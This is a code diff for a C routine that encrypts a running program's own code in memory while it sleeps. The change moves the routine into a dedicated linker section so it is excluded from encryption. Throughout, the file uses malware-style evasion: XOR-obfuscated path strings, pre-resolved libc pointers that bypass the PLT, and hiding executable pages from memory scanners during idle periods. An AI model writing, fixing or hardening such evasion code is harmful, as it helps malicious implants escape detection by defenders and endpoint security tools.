@@ -10,10 +10,11 @@
 //   5. Thread wakes after sleep duration, decrypts, signals the semaphore.
 //   6. Main thread resumes with fully restored code.
 //
-// The functions in this file MUST remain unencrypted. They are detected at
-// runtime via their page range (obf_start .. obf_end) and excluded from
-// encryption. GCC lays out functions within a TU in source order at -Os,
-// so placing obf_start first and obf_end last is sufficient.
+// Exclusion strategy:
+//   All functions in this file carry __attribute__((section("obf_text"))).
+//   GNU ld automatically creates __start_obf_text / __stop_obf_text symbols
+//   that bracket the section exactly, regardless of intra-section ordering.
+//   This is robust against GCC -Os function reordering.
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -34,6 +35,14 @@
 #define PG_DN(x)  ((uintptr_t)(x) & ~(PG - 1))
 #define PG_UP(x)  (((uintptr_t)(x) + PG - 1) & ~(PG - 1))
 
+// All functions in this file go into the "obf_text" section.
+// GNU ld creates __start_obf_text / __stop_obf_text automatically.
+#define _OBF __attribute__((section("obf_text"), used))
+
+// Linker-generated section boundary symbols.
+extern char __start_obf_text[];
+extern char __stop_obf_text[];
+
 typedef struct { void* addr; size_t len; } Seg;
 
 typedef struct {
@@ -48,12 +57,9 @@ typedef struct {
     int (*fn_sem_wait)(sem_t*);
 } SleepCtx;
 
-// Lower page-range boundary of obf code - must be first function in file.
-__attribute__((used)) static void obf_start(void) {}
-
 // Thread: sleeps, XOR-decrypts each segment, restores permissions, signals.
 // Calls go through ctx->fn_* (pre-resolved libc addresses, not PLT).
-static void* sleep_thread(void* arg) {
+_OBF static void* sleep_thread(void* arg) {
     SleepCtx* c = arg;
     struct timespec ts = { .tv_sec = (time_t)c->secs, .tv_nsec = 0 };
     c->fn_nanosleep(&ts, NULL);
@@ -70,8 +76,8 @@ static void* sleep_thread(void* arg) {
 
 // Parse /proc/self/maps and collect r-x code segments belonging to `self`.
 // Splits segments around [skip_lo, skip_hi) to leave the obf pages intact.
-static int collect_segs(Seg out[], int max, uintptr_t skip_lo, uintptr_t skip_hi,
-                         const char* self) {
+_OBF static int collect_segs(Seg out[], int max, uintptr_t skip_lo, uintptr_t skip_hi,
+                              const char* self) {
     FILE* f = fopen(SXOR(SXOR_PROC_MAPS), "r");
     if (!f) return 0;
     int   n = 0;
@@ -100,16 +106,15 @@ static int collect_segs(Seg out[], int max, uintptr_t skip_lo, uintptr_t skip_hi
     return n;
 }
 
-// Upper page-range boundary of obf code - must be last function in file.
-__attribute__((used)) static void obf_end(void) {}
-
 // Drop-in replacement for sleep() with code encryption during the interval.
 // Falls back to plain sleep() on any setup failure.
-void sleep_obf(unsigned int secs) {
+_OBF void sleep_obf(unsigned int secs) {
     if (!secs) return;
 
-    uintptr_t skip_lo = PG_DN((uintptr_t)obf_start);
-    uintptr_t skip_hi = PG_UP((uintptr_t)obf_end);
+    // Use linker-defined section boundaries - robust regardless of GCC
+    // function ordering within the obf_text section.
+    uintptr_t skip_lo = PG_DN((uintptr_t)__start_obf_text);
+    uintptr_t skip_hi = PG_UP((uintptr_t)__stop_obf_text);
 
     char self[512];
     ssize_t sl = readlink(SXOR(SXOR_PROC_EXE), self, sizeof(self) - 1);
